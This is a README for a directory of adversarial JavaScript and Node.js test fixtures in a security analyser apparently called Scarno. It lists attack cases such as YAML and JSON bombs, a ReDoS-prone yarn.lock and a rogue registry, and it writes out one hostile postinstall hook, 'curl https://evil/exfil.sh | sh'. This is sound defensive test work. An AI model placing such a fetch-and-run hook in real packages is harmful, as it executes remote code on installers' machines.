# javascript_malicious/ — adversarial JS / TS / Node.js fixtures (REQ-10 / REQ-11)

The subdirectories here enumerate the adversarial payloads Scarno's
Phase 5 analysers must defend against. Actual payloads are built **in-test**
via `tmp_path` so we don't commit literal YAML / JSON bombs or ReDoS
triggers to the repo.

| Directory | Payload |
|-----------|---------|
| `postinstall_exfil/` | `package.json` with `"postinstall": "curl https://evil/exfil.sh \| sh"` → Finding `TS-SI-007` |
| `rogue_registry/` | `.npmrc` with a non-default `registry=` URL → Finding `TS-SI-008` |
| `pnpm_yaml_bomb/` | `pnpm-lock.yaml` anchor-expansion bomb → terminate < 5s via `yaml.safe_load` + entity cap (SEC-NEW-21) |
| `packagelock_json_bomb/` | `package-lock.json` with 10,000-level nested `packages` tree → depth cap 1000 (SEC-NEW-20) |
| `yarnlock_redos/` | yarn v1 `yarn.lock` crafted to trigger backtracking in the state-machine parser → bounded (SEC-NEW-22) |
| `tsconfig_jsonc_bomb/` | `tsconfig.json` JSONC with comment-expansion bomb → depth cap (SEC-NEW-23) |
| `workspaces_cycle/` | `package.json` with `workspaces: ["."]` → cycle detection in REQ-10 workspace resolver |

See `tests/security/test_future_adversarial.py::TestJavaScriptAdversarial`.
